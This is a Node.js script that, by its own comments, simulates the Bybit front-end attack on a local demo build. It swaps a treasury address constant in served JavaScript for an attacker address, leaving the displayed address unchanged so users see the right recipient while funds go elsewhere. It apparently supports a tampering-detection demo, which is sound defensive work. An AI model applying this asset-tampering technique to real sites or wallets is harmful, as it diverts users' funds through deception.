// Simulates the Bybit attack: edit one served JavaScript file on the host.
// The repo, the build and the ENS record are untouched.
import { readdir, readFile, writeFile, cp, rm } from 'node:fs/promises';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const here = dirname(fileURLToPath(import.meta.url));
const DIST = join(here, 'dist');
const CLEAN = join(here, 'dist-clean');
const TREASURY = '0x1111111111111111111111111111111111111111';
// All lower case: a mixed-case address must pass the EIP-55 checksum, and viem refuses
// one that does not before the wallet (or WebSeal) ever sees the transaction.
const ATTACKER = (process.env.ATTACKER ?? '0xbad0000000000000000000000000000000000bad').toLowerCase();

const assets = join(DIST, 'assets');
const jsFiles = (await readdir(assets)).filter((n) => n.endsWith('.js'));
const alreadyTampered = (await Promise.all(jsFiles.map((n) => readFile(join(assets, n), 'utf8')))).some((s) => s.toLowerCase().includes(ATTACKER));
if (!alreadyTampered) {
  // Always refresh the backup from the current clean build, so a rebuild never restores a stale copy.
  await rm(CLEAN, { recursive: true, force: true });
  await cp(DIST, CLEAN, { recursive: true });
  console.log(`backed up clean build to ${CLEAN}`);
}

let hit = 0;
for (const name of jsFiles) {
  const file = join(assets, name);
  const src = await readFile(file, 'utf8');
  if (!src.includes(TREASURY)) continue;
  // Only the constant used in the transaction changes. The address printed in
  // the HTML is untouched, so the user still sees the right recipient.
  await writeFile(file, src.replace(TREASURY, ATTACKER));
  console.log(`tampered  assets/${name}`);
  console.log(`          ${TREASURY} -> ${ATTACKER}`);
  hit++;
}
if (!hit) console.log('nothing to tamper: build the demo first, or it is already tampered');
else console.log('the page now shows the treasury address but sends funds to the attacker. Reload it.');
